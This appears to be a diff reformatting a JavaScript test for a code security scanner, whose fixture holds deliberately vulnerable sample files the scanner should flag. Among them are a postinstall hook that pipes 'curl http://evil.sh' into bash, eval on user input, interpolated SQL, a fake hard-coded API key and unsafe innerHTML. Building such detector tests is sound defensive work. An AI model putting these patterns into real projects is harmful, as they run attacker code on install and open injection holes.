@@ -11,21 +11,47 @@ import { SEV_ORDER, computeScore } from '../lib/scoring.js';
 import { buildSnippet } from '../lib/snippet.js';
 
 const FILES = [
-  { path: 'src/config.js', content: 'const OPENAI_API_KEY = "sk-proj-abc123def456ghi789jkl012mno345pqr678stu";\nexport const db = { url: process.env.DB };\n' },
-  { path: 'src/db.js', content: 'export function q(id){ return sql`SELECT * FROM users WHERE id = ${id}`; }\nconst token = eval(userInput);\n' },
-  { path: 'package.json', content: '{"name":"x","scripts":{"postinstall":"curl http://evil.sh | bash"},"dependencies":{"leftpad":"1.0.0"}}\n' },
-  { path: 'index.html', content: '<html><head></head><body><div dangerouslySetInnerHTML={{__html: raw}}></div></body></html>\n' },
+  {
+    path: 'src/config.js',
+    content:
+      'const OPENAI_API_KEY = "sk-proj-abc123def456ghi789jkl012mno345pqr678stu";\nexport const db = { url: process.env.DB };\n',
+  },
+  {
+    path: 'src/db.js',
+    content:
+      'export function q(id){ return sql`SELECT * FROM users WHERE id = ${id}`; }\nconst token = eval(userInput);\n',
+  },
+  {
+    path: 'package.json',
+    content:
+      '{"name":"x","scripts":{"postinstall":"curl http://evil.sh | bash"},"dependencies":{"leftpad":"1.0.0"}}\n',
+  },
+  {
+    path: 'index.html',
+    content:
+      '<html><head></head><body><div dangerouslySetInnerHTML={{__html: raw}}></div></body></html>\n',
+  },
 ];
 
 // The App.jsx real-scan sequence, inline (the product path we must match).
 function appScan(files) {
   const findings = [];
   for (const probe of PROBES) {
-    try { const f = probe.fn(files); if (Array.isArray(f)) findings.push(...f); } catch { /* app records failures */ }
+    try {
+      const f = probe.fn(files);
+      if (Array.isArray(f)) findings.push(...f);
+    } catch {
+      /* app records failures */
+    }
   }
   findings.sort((a, b) => SEV_ORDER.indexOf(a.severity) - SEV_ORDER.indexOf(b.severity));
   const fileMap = new Map(files.map((f) => [f.path, f.content]));
-  findings.forEach((f) => { try { const c = fileMap.get(f.file); if (c && f.line) f.snippet = buildSnippet(c, f.line, 5); } catch {} });
+  findings.forEach((f) => {
+    try {
+      const c = fileMap.get(f.file);
+      if (c && f.line) f.snippet = buildSnippet(c, f.line, 5);
+    } catch {}
+  });
   attachStableIds(findings, files);
   attachProbeMeta(findings);
   return { findings, score: computeScore(findings) };
@@ -45,7 +71,9 @@ describe('cockpit-scan: host embedding seam', () => {
   it('PARITY: scan() output equals App.jsx real-scan output (stableIds + score)', () => {
     const mine = scan(FILES);
     const app = appScan(FILES);
-    expect(mine.findings.map((f) => f.stableId).sort()).toEqual(app.findings.map((f) => f.stableId).sort());
+    expect(mine.findings.map((f) => f.stableId).sort()).toEqual(
+      app.findings.map((f) => f.stableId).sort()
+    );
     expect(mine.score).toBe(app.score);
     expect(mine.findings.length).toBe(app.findings.length);
   });
